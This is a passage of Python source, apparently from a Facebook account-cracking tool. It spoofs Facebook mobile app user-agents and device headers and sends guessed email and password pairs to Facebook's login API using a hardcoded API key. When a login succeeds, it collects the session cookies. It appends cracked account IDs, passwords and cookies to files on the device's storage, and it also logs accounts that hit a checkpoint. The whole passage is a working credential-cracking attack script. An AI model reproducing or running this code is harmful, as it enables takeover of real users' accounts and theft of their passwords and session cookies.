                fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
                fbsv_ = fbsv.replace("_",".")
                model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
                abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
                build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
                ua = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') [FBAN/FBIOS;FBAV/'+fbav+';FBBV/'+fbbv+';[FBAN/FBIOS;FBAV/411.0.0.33.109;FBBV/466623474;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.1.1;FBSS/3;FBID/phone;FBLC/ar_IL;FBOP/5;FBRV/469986951] [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;] [FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;] [FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Amazon.com;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;] Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/Wifi service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;] [FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/213310081;FBCR/alfa;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8142;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;] [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=2.625,width=2434,height=1096};FBLC/zh_HK;FBRV/334731776;FBCR/my best phone;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]'
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'api_key':'c1e620fa708a1d5696fb991c1bde5662',
                'community_id':'',
                'device_id':str(uuid.uuid4()),
                'family_device_id':str(uuid.uuid4()),
                'currently_logged_in_userid':'0',
                'try_num':'1',
                'email':ids,
                'password':pas,
                'generate_analytics_claim':'1',
                'cpl':'true',
                'generate_session_cookies':'1',
                'credentials_type':'password',
                'error_detail_type':'button_with_disabled',
                'source':'auth.login',
                'locale':'en_US',
                'client_country_code':'US',
                'advertising_id':str(uuid.uuid4()),
                'meta_inf_fbmeta':'NO_FILE',
                'access_token':access_token}
                head = {
                'Authorization':'OAuth '+access_token,
                'Host': 'b-graph.facebook.com',
                'X-FB-Connection-Quality':'EXCELLENT',
                'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                'x-fb-net-hni':str(random.randint(2e4,4e4)),
                'x-fb-connection-bandwidth':str(random.randint(3e7,4e7)),
                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
                'x-fb-friendly_name':'authenticate',
                'content-encoding':'application/x-www-form-urlencoded',
                'x-tigon-is_retry':'true',
                'x-fb-http-engine':'Liger',
                'x-requested-with':'FBIOS',
                'connection':'keep-alive',
                'user-agent':ua}
                po = session.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
                if 'session_key' in po:
                    ids = str(po['uid'])
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={ssbb};{ckkk}"
                    print(f'\r\r{W}[{G}::{W}] {W}[{G}AXM-OK{W}] {G}{ids} {R}× {G}{pas}')
                    open('/sdcard/AXM-FILE-M4-OK.txt', 'a').write(ids+'|'+pas+"\n")
                    open('/sdcard/AXM-FILE-M4-COOKIES.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                    ok.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\033[1;33m [AXM-CP] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/AXM-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                    cp.append(ids)
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass
__Main_all_sys___for__run__().___file__RanD_All__()
